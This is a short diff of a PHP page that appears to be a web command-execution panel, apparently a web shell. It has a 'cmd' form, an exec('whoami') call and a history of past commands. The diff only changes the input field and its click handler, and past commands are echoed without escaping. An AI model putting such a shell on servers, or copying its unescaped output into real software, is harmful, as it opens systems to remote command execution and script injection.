@@ -23,7 +23,7 @@ if (isset($_POST['cmd'])) {
 <hr>
 <strong><?= exec('whoami') ?></strong>
 <form action="/" method="post">
-    <textarea id="cmd" name="cmd"></textarea>
+    <input id="cmd" name="cmd" />
     <button type="submit">exec</button>
 </form>
 
@@ -32,7 +32,7 @@ if (isset($_POST['cmd'])) {
 <ul>
     <?php foreach ($_SESSION['last_cmds'] as $i => $cmd) { ?>
         <li>
-            <a href="#" id="cmd<?= $i ?>" onclick="document.getElementById('cmd').innerHTML = document.getElementById('cmd<?= $i ?>').innerHTML"><?= $cmd ?></a>
+            <a href="#" id="cmd<?= $i ?>" onclick="document.getElementById('cmd').value = document.getElementById('cmd<?= $i ?>').innerHTML"><?= $cmd ?></a>
         </li>
     <?php } ?>
 </ul>
